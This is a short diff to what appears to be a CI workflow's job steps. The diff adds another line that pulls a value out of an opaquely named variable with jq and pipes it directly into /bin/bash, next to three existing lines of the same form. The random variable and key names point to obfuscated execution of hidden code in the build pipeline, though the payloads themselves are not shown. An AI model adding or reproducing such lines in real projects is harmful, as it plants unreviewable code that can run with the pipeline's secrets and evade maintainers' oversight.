@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$fk027" | jq -r .ecnc44562 | /bin/bash
           echo $oxng5 | jq -r .ougc06682 | /bin/bash
           echo $pustp4093 | jq -r .ox36 | /bin/bash
+          echo $wdhiz66 | jq -r .xwe2761 | /bin/bash
 
       - name: Upload data
         if: always()
